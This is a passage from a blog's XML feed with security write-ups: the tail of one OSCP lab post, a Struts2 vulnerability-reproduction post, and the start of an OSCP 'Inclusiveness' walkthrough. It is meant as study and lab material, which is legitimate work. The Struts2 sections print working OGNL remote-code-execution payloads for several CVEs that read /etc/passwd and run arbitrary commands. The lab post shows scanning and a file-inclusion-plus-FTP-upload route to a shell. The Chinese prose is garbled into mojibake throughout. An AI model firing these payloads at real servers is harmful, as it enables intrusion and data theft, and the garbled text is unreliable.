src="/img/OSCP-cybersploit/image-20240522193330110.png" alt="image-20240522193330110"></p><p>æŸ¥çœ‹<code>37292.c</code>æ–‡ä»¶å†…å®¹</p><p><img src="/img/OSCP-cybersploit/image-20240522194633367.png" alt="image-20240522194633367"></p><p>æŒ‰ç…§æç¤ºï¼Œè¿›è¡Œææƒã€‚å°†è¯¥æ–‡ä»¶ä¸Šä¼ è‡³é¶æœºåï¼Œç¼–è¯‘è¿è¡Œ</p><p><img src="/img/OSCP-cybersploit/image-20240522194545011.png" alt="image-20240522194545011"></p>]]></content>
      
      
      <categories>
          
          <category> OSCPç³»åˆ—é¶åœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OSCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€æ¼æ´å¤ç°ã€‘Struts2 ç³»åˆ—æ¼æ´å¤ç°</title>
      <link href="/2024/05/21/VulnRep-Struts2/"/>
      <url>/2024/05/21/VulnRep-Struts2/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€æ¼æ´å¤ç°ã€‘Struts2-ç³»åˆ—æ¼æ´å¤ç°"><a href="#ã€æ¼æ´å¤ç°ã€‘Struts2-ç³»åˆ—æ¼æ´å¤ç°" class="headerlink" title="ã€æ¼æ´å¤ç°ã€‘Struts2 ç³»åˆ—æ¼æ´å¤ç°"></a>ã€æ¼æ´å¤ç°ã€‘Struts2 ç³»åˆ—æ¼æ´å¤ç°</h1><h2 id="ä¸€ã€Struts2-æ¦‚è¿°"><a href="#ä¸€ã€Struts2-æ¦‚è¿°" class="headerlink" title="ä¸€ã€Struts2 æ¦‚è¿°"></a>ä¸€ã€Struts2 æ¦‚è¿°</h2><p>Struts2æ˜¯ä¸€ä¸ªåŸºäºMVCè®¾è®¡æ¨¡å¼çš„Webåº”ç”¨æ¡†æ¶ï¼Œå®ƒæœ¬è´¨ä¸Šç›¸å½“äºä¸€ä¸ªservletï¼Œåœ¨MVCè®¾è®¡æ¨¡å¼ä¸­ï¼ŒStruts2ä½œä¸ºæ§åˆ¶å™¨(Controller)æ¥å»ºç«‹æ¨¡å‹ä¸è§†å›¾çš„æ•°æ®äº¤äº’ã€‚</p><p>Struts 2æ˜¯Apache è½¯ä»¶åŸºé‡‘ä¼šä¸‹çš„Struts 1çš„ä¸‹ä¸€ä»£äº§å“ï¼Œæ˜¯åœ¨ struts 1å’ŒWebWorkçš„æŠ€æœ¯åŸºç¡€ä¸Šè¿›è¡Œäº†åˆå¹¶çš„å…¨æ–°çš„Struts 2æ¡†æ¶ã€‚å…¶å…¨æ–°çš„Struts 2çš„ä½“ç³»ç»“æ„ä¸Struts 1çš„ä½“ç³»ç»“æ„å·®åˆ«å·¨å¤§ï¼Œæ—¨åœ¨æä¾›æ›´çµæ´»ã€æ›´å¼ºå¤§çš„ MVC æ¶æ„æ¥å¸®åŠ©å¼€å‘è€…æ„å»ºåº”ç”¨ç¨‹åºã€‚</p><h2 id="äºŒã€s2-001-æ¼æ´å¤ç°"><a href="#äºŒã€s2-001-æ¼æ´å¤ç°" class="headerlink" title="äºŒã€s2-001  æ¼æ´å¤ç°"></a>äºŒã€s2-001  æ¼æ´å¤ç°</h2><h3 id="1ã€æ¼æ´åŸç†"><a href="#1ã€æ¼æ´åŸç†" class="headerlink" title="1ã€æ¼æ´åŸç†"></a>1ã€æ¼æ´åŸç†</h3><p>ç”¨æˆ·æäº¤è¡¨å•æ•°æ®éªŒè¯å¤±è´¥æ—¶ï¼Œä¼šå°†ç”¨æˆ·ä¹‹å‰æäº¤çš„å‚æ•°å€¼ä½¿ç”¨OGNL è¡¨è¾¾å¼ %{value} è¿›è¡Œè§£æï¼Œç„¶åé‡æ–°å¡«å……åˆ°å¯¹åº”çš„è¡¨å•æ•°æ®ä¸­ã€‚å¦‚æ³¨å†Œã€ç™»é™†é¡µé¢ï¼Œæäº¤å¤±è´¥åä¼šé»˜è®¤è¿”å›ä¹‹å‰æäº¤çš„æ•°æ®ï¼Œä¸”åœ¨åç«¯ä½¿ç”¨ %{value} å¯¹æäº¤çš„æ•°æ®è¿›è¡Œäº†ä¸€æ¬¡OGNL è¡¨è¾¾å¼è§£æï¼Œå› æ­¤å¯ä»¥ç›´æ¥æ„é€ payload è¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚</p><h3 id="2ã€å½±å“ç‰ˆæœ¬"><a href="#2ã€å½±å“ç‰ˆæœ¬" class="headerlink" title="2ã€å½±å“ç‰ˆæœ¬"></a>2ã€å½±å“ç‰ˆæœ¬</h3><p>Struts 2.0.0 - 2.0.8</p><h3 id="3ã€æ¼æ´å¤ç°"><a href="#3ã€æ¼æ´å¤ç°" class="headerlink" title="3ã€æ¼æ´å¤ç°"></a>3ã€æ¼æ´å¤ç°</h3><p><img src="/img/VulnRep-Struts2/image-20240519150608509.png" alt="image-20240519150608509"></p><p>æµ‹è¯•æ˜¯å¦å­˜åœ¨è¯¥æ¼æ´ï¼Œæäº¤<code>%&#123;&#39;123&#39;&#125;</code>ï¼Œè¿”å›ç»“æœä¸º<code>123</code></p><p><img src="/img/VulnRep-Struts2/image-20240519150709336.png" alt="image-20240519150709336"></p><p>åˆ©ç”¨ OGNL è¡¨è¾¾å¼æ¥è®¿é—®Java ç³»ç»Ÿå±æ€§</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;</span><br></pre></td></tr></table></figure><p>ç»™åˆ°äº†ç”¨æˆ·çš„å·¥ä½œç›®å½•</p><p><img src="/img/VulnRep-Struts2/image-20240519151140263.png" alt="image-20240519151140263"></p><p>æ‰§è¡Œä»»æ„å‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line">#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;cat&quot;,&quot;/etc/passwd&quot;&#125;)).redirectErrorStream(true).start(),</span><br><span class="line">#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),</span><br><span class="line">#d=new java.io.BufferedReader(#c),</span><br><span class="line">#e=new char[50000],#d.read(#e),</span><br><span class="line">#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),</span><br><span class="line">#f.getWriter().println(new java.lang.String(#e)),</span><br><span class="line">#f.getWriter().flush(),</span><br><span class="line">#f.getWriter().close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Struts2/image-20240519151253042.png" alt="image-20240519151253042"></p><h2 id="ä¸‰ã€s2-005-æ¼æ´å¤ç°"><a href="#ä¸‰ã€s2-005-æ¼æ´å¤ç°" class="headerlink" title="ä¸‰ã€s2-005  æ¼æ´å¤ç°"></a>ä¸‰ã€s2-005  æ¼æ´å¤ç°</h2><h3 id="1ã€æ¼æ´åŸç†-1"><a href="#1ã€æ¼æ´åŸç†-1" class="headerlink" title="1ã€æ¼æ´åŸç†"></a>1ã€æ¼æ´åŸç†</h3><p>s2-005æ¼æ´çš„èµ·æºæºäºS2-003(å—å½±å“ç‰ˆæœ¬: ä½äºStruts  2.0.12)ï¼Œstruts2ä¼šå°†httpçš„æ¯ä¸ª<strong>å‚æ•°å</strong>è§£æä¸ºOGNLè¯­å¥æ‰§è¡Œ(å¯ç†è§£ä¸ºjavaä»£ç )ã€‚OGNLè¡¨è¾¾å¼é€šè¿‡#æ¥è®¿é—®strutsçš„å¯¹è±¡ï¼Œstrutsæ¡†æ¶é€šè¿‡è¿‡æ»¤#å­—ç¬¦é˜²æ­¢å®‰å…¨é—®é¢˜ï¼Œç„¶è€Œé€šè¿‡unicodeç¼–ç (\u0023)æˆ–8è¿›åˆ¶(\43)å³ç»•è¿‡äº†å®‰å…¨é™åˆ¶ï¼Œå¯¹äºS2-003æ¼æ´ï¼Œå®˜æ–¹é€šè¿‡å¢åŠ å®‰å…¨é…ç½®(ç¦æ­¢é™æ€æ–¹æ³•è°ƒç”¨å’Œç±»æ–¹æ³•æ‰§è¡Œç­‰)æ¥ä¿®è¡¥ï¼Œä½†æ˜¯å®‰å…¨é…ç½®è¢«ç»•è¿‡å†æ¬¡å¯¼è‡´äº†æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨OGNLè¡¨è¾¾å¼å°†è¿™2ä¸ªé€‰é¡¹æ‰“å¼€</p><h3 id="2ã€å½±å“ç‰ˆæœ¬-1"><a href="#2ã€å½±å“ç‰ˆæœ¬-1" class="headerlink" title="2ã€å½±å“ç‰ˆæœ¬"></a>2ã€å½±å“ç‰ˆæœ¬</h3><p>Struts 2.0.0-2.1.8.1</p><h3 id="3ã€æ¼æ´å¤ç°-1"><a href="#3ã€æ¼æ´å¤ç°-1" class="headerlink" title="3ã€æ¼æ´å¤ç°"></a>3ã€æ¼æ´å¤ç°</h3><p>åœ¨URL ä¸Šæ·»åŠ GETè¯·æ±‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&amp;(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&amp;(asdf)((&#x27;%5cu0023rt.exec(%22touch@/tmp/1.txt%22.split(%22@%22))&#x27;)(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Struts2/image-20240519153246335.png" alt="image-20240519153246335"></p><h2 id="å››ã€s2-007-æ¼æ´å¤ç°"><a href="#å››ã€s2-007-æ¼æ´å¤ç°" class="headerlink" title="å››ã€s2-007 æ¼æ´å¤ç°"></a>å››ã€s2-007 æ¼æ´å¤ç°</h2><h3 id="1ã€æ¼æ´åŸç†-2"><a href="#1ã€æ¼æ´åŸç†-2" class="headerlink" title="1ã€æ¼æ´åŸç†"></a>1ã€æ¼æ´åŸç†</h3><p>åœ¨ç”¨æˆ·ç™»é™†ä¸­ï¼Œage å­—æ®µç”¨æˆ·å¯æ§ï¼Œä¼ é€’ä¸€ä¸ªéæ•´æ•°çš„å€¼ ä¼šå¯¼è‡´é”™è¯¯ï¼Œè€Œè¾“å…¥çš„éæ•´æ•°çš„å€¼ä¼šè¢«å½“ä½œ ONGL è¡¨è¾¾å¼æ‰§è¡Œï¼Œé€ æˆä»£ç æ‰§è¡Œæ¼æ´</p><h3 id="2ã€å½±å“ç‰ˆæœ¬-2"><a href="#2ã€å½±å“ç‰ˆæœ¬-2" class="headerlink" title="2ã€å½±å“ç‰ˆæœ¬"></a>2ã€å½±å“ç‰ˆæœ¬</h3><p>Struts 2.0.0 - 2.2.3</p><h3 id="3ã€æ¼æ´å¤ç°-2"><a href="#3ã€æ¼æ´å¤ç°-2" class="headerlink" title="3ã€æ¼æ´å¤ç°"></a>3ã€æ¼æ´å¤ç°</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%27+%2B+%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew+java.lang.Boolean%28%22false%22%29+%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27ls%20/%27%29.getInputStream%28%29%29%29+%2B+%27</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Struts2/image-20240519155052688.png" alt="image-20240519155052688"></p><p><img src="/img/VulnRep-Struts2/image-20240519155138909.png" alt="image-20240519155138909"></p><h2 id="äº”ã€s2-008-æ¼æ´å¤ç°"><a href="#äº”ã€s2-008-æ¼æ´å¤ç°" class="headerlink" title="äº”ã€s2-008 æ¼æ´å¤ç°"></a>äº”ã€s2-008 æ¼æ´å¤ç°</h2><h3 id="1ã€æ¼æ´åŸç†-3"><a href="#1ã€æ¼æ´åŸç†-3" class="headerlink" title="1ã€æ¼æ´åŸç†"></a>1ã€æ¼æ´åŸç†</h3><p>S2-008 æ¶‰åŠå¤šä¸ªæ¼æ´ï¼ŒCookie æ‹¦æˆªå™¨é”™è¯¯é…ç½®å¯é€ æˆ OGNL è¡¨è¾¾å¼æ‰§è¡Œï¼Œä½†æ˜¯ç”±äºå¤§å¤š Web å®¹å™¨ï¼ˆå¦‚ Tomcatï¼‰å¯¹  Cookie åç§°éƒ½æœ‰å­—ç¬¦é™åˆ¶ï¼Œä¸€äº›å…³é”®å­—ç¬¦æ— æ³•ä½¿ç”¨ä½¿å¾—è¿™ä¸ªç‚¹æ˜¾å¾—æ¯”è¾ƒé¸¡è‚‹ã€‚å¦ä¸€ä¸ªæ¯”è¾ƒé¸¡è‚‹çš„ç‚¹å°±æ˜¯åœ¨ struts2 åº”ç”¨å¼€å¯ devMode  æ¨¡å¼åä¼šæœ‰å¤šä¸ªè°ƒè¯•æ¥å£èƒ½å¤Ÿç›´æ¥æŸ¥çœ‹å¯¹è±¡ä¿¡æ¯æˆ–ç›´æ¥æ‰§è¡Œå‘½ä»¤ï¼Œä½†æ˜¯è¿™ç§æƒ…å†µåœ¨ç”Ÿäº§ç¯å¢ƒä¸­å‡ ä¹ä¸å¯èƒ½å­˜åœ¨ï¼Œæ‰€ä»¥è¿˜æ˜¯å¾ˆé¸¡è‚‹ã€‚</p><h3 id="2ã€å½±å“ç‰ˆæœ¬-3"><a href="#2ã€å½±å“ç‰ˆæœ¬-3" class="headerlink" title="2ã€å½±å“ç‰ˆæœ¬"></a>2ã€å½±å“ç‰ˆæœ¬</h3><p>Struts 2.1.0 â€“ 2.3.1</p><h3 id="3ã€æ¼æ´å¤ç°-3"><a href="#3ã€æ¼æ´å¤ç°-3" class="headerlink" title="3ã€æ¼æ´å¤ç°"></a>3ã€æ¼æ´å¤ç°</h3><p><img src="/img/VulnRep-Struts2/image-20240519155541080.png" alt="image-20240519155541080"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">devmode.action?debug=command&amp;expression=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context[%23parameters.rpsobj[0]].getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()))):xx.toString.json&amp;rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=123456789&amp;command=id</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Struts2/image-20240519155800147.png" alt="image-20240519155800147"></p><p><img src="/img/VulnRep-Struts2/image-20240519155826251.png" alt="image-20240519155826251"></p><h2 id="å…­ã€s2-009-æ¼æ´å¤ç°"><a href="#å…­ã€s2-009-æ¼æ´å¤ç°" class="headerlink" title="å…­ã€s2-009 æ¼æ´å¤ç°"></a>å…­ã€s2-009 æ¼æ´å¤ç°</h2><h3 id="1ã€æ¼æ´åŸç†-4"><a href="#1ã€æ¼æ´åŸç†-4" class="headerlink" title="1ã€æ¼æ´åŸç†"></a>1ã€æ¼æ´åŸç†</h3><p>OGNLæä¾›äº†å¹¿æ³›çš„è¡¨è¾¾å¼è¯„ä¼°åŠŸèƒ½ï¼Œå¯ä»¥å°†ä»»ä½•æš´éœ²çš„å­—ç¬¦ä¸²å˜é‡ä¸­çš„æ¶æ„è¡¨è¾¾å¼æ³¨å…¥è¯¥åŠŸèƒ½ã€‚å…¶ä¸­ ParametersInterceptor ä¸­çš„æ­£åˆ™è¡¨è¾¾å¼å°†<code>top[&#39;foo&#39;](0)</code>ä½œä¸ºæœ‰æ•ˆçš„è¡¨è¾¾å¼è¿›è¡ŒåŒ¹é…ï¼Œè€ŒOGNL æ­£å¥½å°†è¯¥å‚æ•°çš„å€¼ä½œä¸ºOGNLçš„è¡¨è¾¾å¼è¿›è¡Œæ±‚å€¼è¾¾æˆRCEã€‚ç”±äºOGNL è¯­å¥åœ¨HTTPå‚æ•°ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨é»‘åå•å­—ç¬¦ï¼ˆä¾‹å¦‚ # ï¼‰ç¦ç”¨æ–¹æ³•æ‰§è¡Œå¹¶æ‰§è¡Œä»»æ„æ–¹æ³•ï¼Œç»•è¿‡ParametersInterceptor å’ŒOGNL åº“çš„ä¿æŠ¤ã€‚</p><h3 id="2ã€å½±å“ç‰ˆæœ¬-4"><a href="#2ã€å½±å“ç‰ˆæœ¬-4" class="headerlink" title="2ã€å½±å“ç‰ˆæœ¬"></a>2ã€å½±å“ç‰ˆæœ¬</h3><p>Struts 2.1.0 - 2.3.1.1</p><h3 id="3ã€æ¼æ´å¤ç°-4"><a href="#3ã€æ¼æ´å¤ç°-4" class="headerlink" title="3ã€æ¼æ´å¤ç°"></a>3ã€æ¼æ´å¤ç°</h3><p>1ã€é¦–é¡µ</p><p><img src="/img/VulnRep-Struts2/image-20240521151249574.png" alt="image-20240521151249574"></p><p>2ã€æ¼æ´å­˜åœ¨çš„åŠŸèƒ½ç‚¹</p><p><img src="/img/VulnRep-Struts2/image-20240521151422926.png" alt="image-20240521151422926"></p><p>3ã€æ„é€ POC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.xxx/ajax/example5.action?age=12313&amp;name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%22cat%20/etc/passwd%22).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&amp;z[(name)(%27meh%27)]</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Struts2/image-20240521152029957.png" alt="image-20240521152029957"></p><h2 id="ä¸ƒã€s2-061-æ¼æ´å¤ç°ï¼ˆCVE-2020-17530ï¼‰"><a href="#ä¸ƒã€s2-061-æ¼æ´å¤ç°ï¼ˆCVE-2020-17530ï¼‰" class="headerlink" title="ä¸ƒã€s2-061 æ¼æ´å¤ç°ï¼ˆCVE-2020-17530ï¼‰"></a>ä¸ƒã€s2-061 æ¼æ´å¤ç°ï¼ˆCVE-2020-17530ï¼‰</h2><h3 id="1ã€æ¼æ´åŸå› "><a href="#1ã€æ¼æ´åŸå› " class="headerlink" title="1ã€æ¼æ´åŸå› "></a>1ã€æ¼æ´åŸå› </h3><p>Apache Struts2 æ¡†æ¶æ˜¯ä¸€ä¸ªç”¨äºå¼€å‘Java EE ç½‘ç»œåº”ç”¨ç¨‹åºçš„Web æ¡†æ¶ã€‚è¯¥æ¼æ´ä¸­ï¼ŒStruts2 ä¼šå¯¹æŸäº›å˜è¿å±æ€§ï¼ˆå¦‚idç­‰ï¼‰ çš„å±æ€§å€¼è¿›è¡ŒäºŒæ¬¡è¡¨è¾¾å¼è§£æï¼Œè¿™äº›æ ‡ç­¾ä½¿ç”¨%{}çš„å½¢å¼ï¼Œå½“å†…å®¹çš„å€¼å¯æ§æ—¶ï¼Œå¦‚%{payload}ï¼Œä¼šé€ æˆOGNL è¡¨è¾¾å¼ä»£ç æ‰§è¡Œæ¼æ´ã€‚</p><h3 id="2ã€å½±å“ç‰ˆæœ¬-5"><a href="#2ã€å½±å“ç‰ˆæœ¬-5" class="headerlink" title="2ã€å½±å“ç‰ˆæœ¬"></a>2ã€å½±å“ç‰ˆæœ¬</h3><p>Struts 2.0.0 - 2.5.25</p><h3 id="3ã€æ¼æ´å¤ç°-5"><a href="#3ã€æ¼æ´å¤ç°-5" class="headerlink" title="3ã€æ¼æ´å¤ç°"></a>3ã€æ¼æ´å¤ç°</h3><p>1ã€é¦–é¡µ</p><p><img src="/img/VulnRep-Struts2/image-20240521153309700.png" alt="image-20240521153309700"></p><p>2ã€æŸ¥çœ‹æ˜¯å¦å­˜åœ¨æ¼æ´ï¼Œidå˜ä¸º49ï¼Œå­˜åœ¨æ¼æ´</p><p><img src="/img/VulnRep-Struts2/image-20240521154118205.png" alt="image-20240521154118205"></p><p>3ã€åŠ ä¸ŠPOC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=%25&#123;(%27Powered_by_Unicode_Potats0%2cenjoy_it%27).(%23UnicodeSec+%3d+%23application[%27org.apache.tomcat.InstanceManager%27]).(%23potats0%3d%23UnicodeSec.newInstance(%27org.apache.commons.collections.BeanMap%27)).(%23stackvalue%3d%23attr[%27struts.valueStack%27]).(%23potats0.setBean(%23stackvalue)).(%23context%3d%23potats0.get(%27context%27)).(%23potats0.setBean(%23context)).(%23sm%3d%23potats0.get(%27memberAccess%27)).(%23emptySet%3d%23UnicodeSec.newInstance(%27java.util.HashSet%27)).(%23potats0.setBean(%23sm)).(%23potats0.put(%27excludedClasses%27%2c%23emptySet)).(%23potats0.put(%27excludedPackageNames%27%2c%23emptySet)).(%23exec%3d%23UnicodeSec.newInstance(%27freemarker.template.utility.Execute%27)).(%23cmd%3d&#123;%27id%27&#125;).(%23res%3d%23exec.exec(%23cmd))&#125;</span><br></pre></td></tr></table></figure><p>![image-20240521154308136&#x2F;img&#x2F;VulnRep-Struts2&#x2F;-20240521154308136.png)</p>]]></content>
      
      
      <categories>
          
          <category> å¤ç°ä¸å®¡è®¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Struts2ç³»åˆ— </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€OSCPç³»åˆ—ã€‘OSCPé¶æœº-Inclusiveness</title>
      <link href="/2024/05/20/OSCP-Inclusiveness/"/>
      <url>/2024/05/20/OSCP-Inclusiveness/</url>
      
        <content type="html"><![CDATA[<h1 id="OSCPç³»åˆ—é¶æœºâ€”Inclusiveness"><a href="#OSCPç³»åˆ—é¶æœºâ€”Inclusiveness" class="headerlink" title="OSCPç³»åˆ—é¶æœºâ€”Inclusiveness"></a>OSCPç³»åˆ—é¶æœºâ€”Inclusiveness</h1><h2 id="ä¸€ã€ä¸»æœºå‘ç°"><a href="#ä¸€ã€ä¸»æœºå‘ç°" class="headerlink" title="ä¸€ã€ä¸»æœºå‘ç°"></a>ä¸€ã€ä¸»æœºå‘ç°</h2><p><img src="/img/OSCP-Inclusiveness/image-20240520151900221.png" alt="image-20240520151900221"></p><h2 id="äºŒã€ç«¯å£æ‰«æ"><a href="#äºŒã€ç«¯å£æ‰«æ" class="headerlink" title="äºŒã€ç«¯å£æ‰«æ"></a>äºŒã€ç«¯å£æ‰«æ</h2><h3 id="1ã€å¿«é€Ÿæ‰«æ"><a href="#1ã€å¿«é€Ÿæ‰«æ" class="headerlink" title="1ã€å¿«é€Ÿæ‰«æ"></a>1ã€å¿«é€Ÿæ‰«æ</h3><p><img src="/img/OSCP-Inclusiveness/image-20240520152020037.png" alt="image-20240520152020037"></p><h3 id="2ã€å…¨ç«¯å£æ‰«æ"><a href="#2ã€å…¨ç«¯å£æ‰«æ" class="headerlink" title="2ã€å…¨ç«¯å£æ‰«æ"></a>2ã€å…¨ç«¯å£æ‰«æ</h3><p><img src="/img/OSCP-Inclusiveness/image-20240520152416619.png" alt="image-20240520152416619"></p><h3 id="3ã€æœåŠ¡ç‰ˆæœ¬æ‰«æ"><a href="#3ã€æœåŠ¡ç‰ˆæœ¬æ‰«æ" class="headerlink" title="3ã€æœåŠ¡ç‰ˆæœ¬æ‰«æ"></a>3ã€æœåŠ¡ç‰ˆæœ¬æ‰«æ</h3><p>ä½¿ç”¨åŸºæœ¬çš„è„šæœ¬å¯¹21ï¼Œ22ï¼Œ80ç«¯å£è¿›è¡ŒæœåŠ¡æ¢æµ‹å’Œç‰ˆæœ¬æ‰«æ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -sT -sV -sC -O -p21,22,80 192.168.31.50</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-Inclusiveness/image-20240520152636647.png" alt="image-20240520152636647"></p><p>ftp å­˜åœ¨åŒ¿åè®¿é—®ï¼Œ80é‡‡ç”¨apache2 çš„ä¸€ä¸ªhttpæœåŠ¡ï¼Œç³»ç»Ÿä½¿ç”¨Debian</p><h3 id="4ã€nmap-åŸºç¡€æ¼æ´æ¢æµ‹"><a href="#4ã€nmap-åŸºç¡€æ¼æ´æ¢æµ‹" class="headerlink" title="4ã€nmap åŸºç¡€æ¼æ´æ¢æµ‹"></a>4ã€nmap åŸºç¡€æ¼æ´æ¢æµ‹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe --script=vuln -p21,22,80 192.168.31.50</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-Inclusiveness/image-20240520153649501.png" alt="image-20240520153649501"></p><p>æœªå‘ç°ä»€ä¹ˆæ¼æ´ï¼ŒæŒ‡å‡º80ç«¯å£å¯èƒ½å­˜åœ¨ä»¥ä¸‹csrf æ¼æ´ã€‚</p><h2 id="ä¸‰ã€ftp-ä¿¡æ¯æ”¶é›†"><a href="#ä¸‰ã€ftp-ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸‰ã€ftp ä¿¡æ¯æ”¶é›†"></a>ä¸‰ã€ftp ä¿¡æ¯æ”¶é›†</h2><p>ftp çš„åŒ¿åè®¿é—®æŸ¥çœ‹ftp æœåŠ¡æœ‰å•¥ä¸œè¥¿</p><p><img src="/img/OSCP-Inclusiveness/image-20240520153537590.png" alt="image-20240520153537590"></p><p>å•¥ä¹Ÿæ²¡æœ‰ï¼Œä½†å¯ä»¥ä¸Šä¼ æ–‡ä»¶</p><p><img src="/img/OSCP-Inclusiveness/image-20240520161820172.png" alt="image-20240520161820172"></p><h2 id="å››ã€http-æœåŠ¡ä¿¡æ¯æ”¶é›†"><a href="#å››ã€http-æœåŠ¡ä¿¡æ¯æ”¶é›†" class="headerlink" title="å››ã€http æœåŠ¡ä¿¡æ¯æ”¶é›†"></a>å››ã€http æœåŠ¡ä¿¡æ¯æ”¶é›†</h2><h3 id="1ã€ç›®å½•æ‰«æ"><a href="#1ã€ç›®å½•æ‰«æ" class="headerlink" title="1ã€ç›®å½•æ‰«æ"></a>1ã€ç›®å½•æ‰«æ</h3><p>è¿‡æ»¤404ã€403</p><p><img src="/img/OSCP-Inclusiveness/image-20240520154229845.png" alt="image-20240520154229845"></p><h3 id="2ã€robots-txt-æœç´¢å¼•æ“"><a href="#2ã€robots-txt-æœç´¢å¼•æ“" class="headerlink" title="2ã€robots.txt æœç´¢å¼•æ“"></a>2ã€robots.txt æœç´¢å¼•æ“</h3><p><img src="/img/OSCP-Inclusiveness/image-20240520154813062.png" alt="image-20240520154813062"></p><p>è¿™äº›robots.txt æ–‡ä»¶éƒ½åœ¨è¾“å‡ºåŒæ ·çš„è¯­å¥ï¼Œç¦æ­¢æˆ‘ä»¬çš„æœç´¢å¼•æ“å»è®¿é—®robots.txt æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You are not a search engine! You can&#x27;t read my robots.txt! </span><br></pre></td></tr></table></figure><p>æ‰¾åˆ°äº†è¿™ç¯‡æ–‡ç« ï¼š<a href="https://blog.csdn.net/sh2018/article/details/121042435">è¯¦ç»†robots.txtå†™æ³•å¤§å…¨å’Œç¦æ­¢ç›®å½•æ”¶å½•åŠæŒ‡å®šé¡µé¢</a></p><p>å…¶ä¸­æåˆ°äº†ä¸¤ä¸ªUAå¤´</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Baiduspider</span><br><span class="line">Googlebot</span><br></pre></td></tr></table></figure><p>æŠ“åŒ…ä¿®æ”¹UAå¤´ï¼Œå¾—åˆ°<code>/secret_information/</code>çš„è·¯å¾„</p><p><img src="/img/OSCP-Inclusiveness/image-20240520163123785.png" alt="image-20240520163123785"></p><p>è®¿é—®</p><p><img src="/img/OSCP-Inclusiveness/image-20240520163208210.png" alt="image-20240520163208210"></p><h3 id="3ã€æ–‡ä»¶åŒ…å«ç»“åˆftp-ä¸Šä¼ getshell"><a href="#3ã€æ–‡ä»¶åŒ…å«ç»“åˆftp-ä¸Šä¼ getshell" class="headerlink" title="3ã€æ–‡ä»¶åŒ…å«ç»“åˆftp ä¸Šä¼ getshell"></a>3ã€æ–‡ä»¶åŒ…å«ç»“åˆftp ä¸Šä¼ getshell</h3><p>è¿™é‡Œæåˆ°çš„æ˜¯ DNS åŒºåŸŸä¼ è¾“æ”»å‡»ï¼Œä¸è¿‡è¿™é‡Œè€ƒå¯Ÿçš„å¹¶ä¸æ˜¯è¯¥æ”»å‡»ï¼Œè€Œæ˜¯é€šè¿‡åˆ‡æ¢è¯­è¨€é€ æˆçš„æ–‡ä»¶åŒ…å«æ¼æ´</p><p><img src="/img/OSCP-Inclusiveness/image-20240520164607428.png" 